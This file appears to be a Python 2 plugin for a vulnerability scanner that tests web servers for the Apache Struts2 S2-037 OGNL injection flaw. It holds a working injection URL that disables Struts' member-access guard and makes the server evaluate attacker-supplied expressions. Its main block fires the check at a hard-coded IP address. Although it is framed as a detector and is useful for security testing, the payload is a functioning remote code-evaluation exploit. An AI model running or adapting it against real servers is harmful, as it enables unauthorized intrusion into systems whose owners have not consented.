#coding:utf-8
import urllib2
import random


from t import T




class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='80',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        res=None

        result['result']=False
        res_html=None
        rand_num1 = random.randint(300, 3000)
        rand_num2 = random.randint(600, 6000)
        result_str = str(rand_num1) + str(rand_num2)
        vul_url = target_url + "/%28%23yautc5yautc%3D%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3F@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29.print%28%23parameters.t1[0]%2B%23parameters.t2[0]%29%3Aindex.xhtml?t1={}&t2={}".format(rand_num1,rand_num2)
        try:
            res=urllib2.urlopen(vul_url,timeout=timeout)
            res_html = res.read()
        except:
            res_html=''
        finally:
            if res is not None:
                res.close()

        if result_str in res_html:
            info = vul_url + " struts037 Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='struts037 Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=vul_url
            result['VerifyInfo']['result'] =info
            return result
        return result

   

           

if __name__ == '__main__':
    print P().verify(ip='103.17.42.170',port='80')